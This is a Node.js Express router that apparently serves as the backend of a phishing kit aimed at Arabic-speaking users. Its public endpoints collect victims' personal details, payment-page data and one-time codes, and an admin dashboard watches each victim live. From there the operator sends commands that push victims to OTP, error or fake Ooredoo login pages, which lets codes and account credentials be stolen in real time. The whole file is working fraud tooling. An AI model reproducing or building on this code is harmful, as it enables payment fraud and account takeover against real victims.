const express = require('express');
const router = express.Router();
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const Admin = require('../models/Admin');
const User = require('../models/User');
const Submission = require('../models/Submission');
const Message = require('../models/Message');
const Event = require('../models/Event');
const Command = require('../models/Command');

// JWT Secret
const JWT_SECRET = process.env.JWT_SECRET || 'fallback_secret';

// SSE Clients
let sseClients = [];

// Helper: Broadcast Event to all SSE clients
const broadcastEvent = async (type, payload) => {
  const event = new Event({ type, payload });
  await event.save();
  const eventId = event._id.toString();
  sseClients.forEach(client => {
    client.res.write(`id: ${eventId}\n`);
    client.res.write(`event: ${type}\n`);
    client.res.write(`data: ${JSON.stringify(payload)}\n\n`);
  });
};

// --- Middleware: Admin Auth ---
const requireAdmin = async (req, res, next) => {
  const token = req.cookies.jusour_admin_session;
  if (!token) return res.status(401).json({ ok: false, error: 'Authentication required.' });
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    const admin = await Admin.findById(decoded.id);
    if (!admin) throw new Error();
    req.admin = admin;
    req.csrf = decoded.csrf;
    
    // Check CSRF for write requests
    if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
      const csrfToken = req.headers['x-csrf-token'];
      if (!csrfToken || csrfToken !== decoded.csrf) {
        return res.status(403).json({ ok: false, error: 'Invalid or missing CSRF token.' });
      }
    }
    next();
  } catch (err) {
    res.status(401).json({ ok: false, error: 'Invalid session.' });
  }
};

// --- Public Endpoints ---

// POST /api/submit
router.post('/submit', async (req, res) => {
  try {
    const { ref, page_key, summary, fields, name, phone, address, email, country, service, total_price, c_name } = req.body;
    if (!ref) return res.status(422).json({ ok: false, error: 'A valid ref is required.' });

    let user = await User.findOne({ ref });
    const isNew = !user;
    if (!user) {
      user = new User({ ref, name: c_name || name || '', phone, address, email, country, service, total_price });
    } else {
      if (c_name || name) user.name = c_name || name;
      if (phone) user.phone = phone;
      if (address) user.address = address;
      if (email) user.email = email;
      if (country) user.country = country;
      if (service) user.service = service;
      if (total_price) user.total_price = total_price;
    }
    
    const actualPageKey = page_key || 'activity';
    user.current_page = actualPageKey;
    user.last_activity = new Date();
    user.is_read = false;

    if (summary === 'WAITING-IN-LOADING' || summary === 'WAITING-OTP-ACTION' || summary === 'WAITING-ERROR-ACTION') {
      user.status = 'waiting';
      user.waiting_for_decision = true;
    }

    await user.save();

    if (fields && fields.length > 0) {
      const submission = new Submission({
        user_id: user._id,
        page_key: actualPageKey,
        page_label: summary || actualPageKey,
        summary: summary || actualPageKey,
        payload: fields
      });
      await submission.save();
      
      broadcastEvent('submission.created', {
        user,
        page_key: actualPageKey,
        page_label: summary || actualPageKey,
        summary: summary || actualPageKey
      });
    }

    if (isNew) {
      broadcastEvent('user.created', user);
    } else {
      broadcastEvent('user.updated', user);
    }

    res.json({ ok: true, user_id: user._id, is_new: isNew, page: actualPageKey });
  } catch (error) {
    console.error(error);
    res.status(500).json({ ok: false, error: 'Server error.' });
  }
});

// GET /api/poll_commands
router.get('/poll_commands', async (req, res) => {
  const { ref } = req.query;
  if (!ref) return res.status(422).json({ ok: false, error: 'A valid ref is required.' });

  const user = await User.findOne({ ref });
  if (!user) return res.json({ ok: true, command: null, redirect: null });

  const command = await Command.findOneAndUpdate(
    { user_id: user._id, consumed_at: null },
    { consumed_at: new Date() },
    { sort: { created_at: 1 } }
  );

  if (!command) return res.json({ ok: true, command: null, redirect: null });

  // Map command string to redirect path based on legacy definitions
  const redirects = {
    'WAIT': null,
    'OTP': 'otp.html',
    'WRONG': 'error.html',
    'ERROR': 'payment.html',
    'SUCCESS': 'success.html',
    'OOREDOO': 'ooredoo-login.html',
    'OOR_REG': 'ooredoo-reg.html',
    'OOR_ERR': 'ooredoo-login.html',
    'ID_ERR': 'ooredoo-reg.html',
    'RESUME': 'loading.html'
  };

  res.json({
    ok: true,
    command: command.command,
    redirect: redirects[command.command] || null,
    status: '', // You can add status mapping here if needed
    label: command.command
  });
});

// --- Auth Endpoints ---

// POST /api/login
router.post('/login', async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.status(422).json({ ok: false, error: 'Username and password required.' });

  const admin = await Admin.findOne({ username });
  if (!admin || !bcrypt.compareSync(password, admin.password_hash)) {
    return res.status(401).json({ ok: false, error: 'Invalid username or password.' });
  }

  admin.last_login_at = new Date();
  await admin.save();

  const csrf = crypto.randomBytes(24).toString('hex');
  const token = jwt.sign({ id: admin._id, csrf }, JWT_SECRET, { expiresIn: '30d' });

  res.cookie('jusour_admin_session', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'Strict',
    maxAge: 30 * 24 * 60 * 60 * 1000 // 30 days
  });

  res.json({
    ok: true,
    admin: { id: admin._id, username: admin.username, display_name: admin.display_name },
    csrf
  });
});

// POST /api/logout
router.post('/logout', requireAdmin, (req, res) => {
  res.clearCookie('jusour_admin_session');
  res.json({ ok: true });
});

// GET /api/session
router.get('/session', requireAdmin, (req, res) => {
  res.json({
    ok: true,
    admin: { id: req.admin._id, username: req.admin.username, display_name: req.admin.display_name }
  });
});

// --- Dashboard Endpoints ---

// GET /api/bootstrap
router.get('/bootstrap', requireAdmin, async (req, res) => {
  const users = await User.find().sort({ last_activity: -1 }).limit(100);
  
  const statuses = [
    { key: 'new', label_ar: 'جديد', tone: 'info' },
    { key: 'waiting', label_ar: 'قيد الانتظار', tone: 'warning', waiting: true },
    { key: 'otp_requested', label_ar: 'مطلوب رمز', tone: 'warning', waiting: true },
    { key: 'retry', label_ar: 'إعادة محاولة', tone: 'warning', waiting: true },
    { key: 'ooredoo', label_ar: 'أوريدو', tone: 'warning', waiting: true },
    { key: 'completed', label_ar: 'مكتمل', tone: 'success' },
    { key: 'ignored', label_ar: 'متجاهل', tone: 'neutral' }
  ];

  const commands = [
    { key: 'WAIT', label_ar: 'انتظار' },
    { key: 'OTP', label_ar: 'طلب OTP' },
    { key: 'WRONG', label_ar: 'رمز خاطئ' },
    { key: 'ERROR', label_ar: 'خطأ بالدفع' },
    { key: 'SUCCESS', label_ar: 'نجاح' },
    { key: 'OOREDOO', label_ar: 'أوريدو' },
    { key: 'OOR_REG', label_ar: 'أوريدو (تسجيل)' },
    { key: 'OOR_ERR', label_ar: 'أوريدو (خطأ)' },
    { key: 'ID_ERR', label_ar: 'هوية خاطئة' },
    { key: 'RESUME', label_ar: 'متابعة' }
  ];
  
  const pages = [
    { key: 'activity', label_ar: 'نشاط' },
    { key: 'hourly', label_ar: 'ساعات' },
    { key: 'monthly', label_ar: 'شهري' },
    { key: 'recruitment', label_ar: 'استقدام' },
    { key: 'customer', label_ar: 'معلومات العميل' },
    { key: 'summary', label_ar: 'الملخص' },
    { key: 'payment_methods', label_ar: 'طرق الدفع' },
    { key: 'payment', label_ar: 'الدفع' },
    { key: 'otp', label_ar: 'التحقق' },
    { key: 'ooredoo_login', label_ar: 'أوريدو (دخول)' },
    { key: 'ooredoo_reg', label_ar: 'أوريدو (تسجيل)' },
    { key: 'ooredoo_forgot', label_ar: 'أوريدو (نسيان)' }
  ];

  res.json({ ok: true, admin: { username: req.admin.username }, conversations: users, statuses, commands, pages, csrf: req.csrf });
});

// GET /api/conversations
router.get('/conversations', requireAdmin, async (req, res) => {
  const limit = parseInt(req.query.limit) || 100;
  const users = await User.find().sort({ last_activity: -1 }).limit(limit);
  res.json({ ok: true, conversations: users });
});

// GET /api/conversation
router.get('/conversation', requireAdmin, async (req, res) => {
  const { id } = req.query;
  const user = await User.findById(id);
  if (!user) return res.status(404).json({ ok: false, error: 'Not found.' });
  const submissions = await Submission.find({ user_id: user._id }).sort({ created_at: 1 });
  const messages = await Message.find({ user_id: user._id }).sort({ created_at: 1 });
  
  // Build navigation dynamically from submissions
  const pageMap = new Map();
  submissions.forEach(sub => {
    if (!pageMap.has(sub.page_key)) {
      pageMap.set(sub.page_key, { key: sub.page_key, label_ar: sub.page_label, count: 0, has_data: true });
    }
    pageMap.get(sub.page_key).count += 1;
  });
  const navigation = Array.from(pageMap.values());

  res.json({
    ok: true,
    conversation: {
      user: user,
      profile: {
        name: user.name, phone: user.phone, address: user.address,
        email: user.email, country: user.country, service: user.service, total_price: user.total_price
      },
      navigation: navigation,
      submissions: submissions,
      messages: messages
    }
  });
});

// POST /api/mark_read
router.post('/mark_read', requireAdmin, async (req, res) => {
  const { id, read, all } = req.body;
  const isRead = read === 1 || read === true;
  if (all) {
    await User.updateMany({}, { is_read: isRead });
    broadcastEvent('conversations.read_all', {});
  } else {
    await User.findByIdAndUpdate(id, { is_read: isRead });
    broadcastEvent('user.read', { id, is_read: isRead });
  }
  res.json({ ok: true });
});

// POST /api/set_status
router.post('/set_status', requireAdmin, async (req, res) => {
  const { id, status } = req.body;
  const waiting = ['waiting', 'otp_requested', 'retry', 'ooredoo'].includes(status);
  const user = await User.findByIdAndUpdate(id, { status, waiting_for_decision: waiting }, { new: true });
  broadcastEvent('user.status', { id, status, waiting_for_decision: waiting });
  res.json({ ok: true, user });
});

// POST /api/issue_command
router.post('/issue_command', requireAdmin, async (req, res) => {
  const { id, command } = req.body;
  const user = await User.findById(id);
  if (!user) return res.status(404).json({ ok: false, error: 'User not found.' });

  const cmd = new Command({ user_id: user._id, command, issued_by: req.admin.username });
  await cmd.save();

  broadcastEvent('command.issued', { user_id: user._id, command, created_at: cmd.created_at });
  res.json({ ok: true, user });
});

// GET /api/stream (SSE)
router.get('/stream', requireAdmin, (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders(); // flush the headers to establish SSE

  const clientId = Date.now();
  const newClient = { id: clientId, res };
  sseClients.push(newClient);

  // Send initial connected event
  res.write(`event: connected\ndata: ${JSON.stringify({ message: "SSE connected" })}\n\n`);

  const keepAlive = setInterval(() => {
    res.write(':\n\n');
  }, 15000);

  req.on('close', () => {
    clearInterval(keepAlive);
    sseClients = sseClients.filter(client => client.id !== clientId);
  });
});

// --- Seed Initial Admin ---
const seedAdmin = async () => {
  try {
    const count = await Admin.countDocuments();
    if (count === 0) {
      const password = crypto.randomBytes(8).toString('hex');
      const hash = bcrypt.hashSync(password, 10);
      const admin = new Admin({ username: 'admin', password_hash: hash, display_name: 'admin' });
      await admin.save();
      console.log(`\n\n--- INITIAL ADMIN CREATED ---`);
      console.log(`Username: admin\nPassword: ${password}`);
      console.log(`-----------------------------\n\n`);
    }
  } catch (err) {
    console.error('Failed to seed admin (Database not connected yet):', err.message);
  }
};
seedAdmin();

module.exports = router;
